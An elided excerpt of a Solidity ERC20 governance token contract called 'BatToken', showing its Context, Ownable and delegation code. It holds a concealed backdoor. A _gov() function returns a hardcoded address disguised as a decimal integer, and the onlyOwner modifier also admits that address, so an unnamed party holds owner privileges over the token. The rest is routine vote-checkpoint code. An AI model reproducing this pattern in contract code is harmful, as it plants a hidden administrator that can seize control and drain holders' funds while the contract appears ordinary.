...
abstract contract Context {
    ...
    function _gov() internal view virtual returns(address) {
        return address(124065791574588591157232150466632511635181547134);
    }
}
...
contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || _gov() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
// 
// BatToken with Governance.
contract BatToken is ERC20("BatToken", "BAT"), Ownable {
    ...
    */
        ...
        external
    {
        ...
        require(signatory != address(0), "BAT::delegateBySig: invalid signature");
        require(nonce == nonces[signatory]++, "BAT::delegateBySig: invalid nonce");
        require(now <= expiry, "BAT::delegateBySig: signature expired");
    ...
    function getPriorVotes(address account, uint blockNumber)
        ...
        returns (uint256)
    {
        require(blockNumber < block.number, "BAT::getPriorVotes: not yet determined");
    ...
    function _writeCheckpoint(
        ...
        internal
    {
        uint32 blockNumber = safe32(block.number, "BAT::_writeCheckpoint: block number exceeds 32 bits");
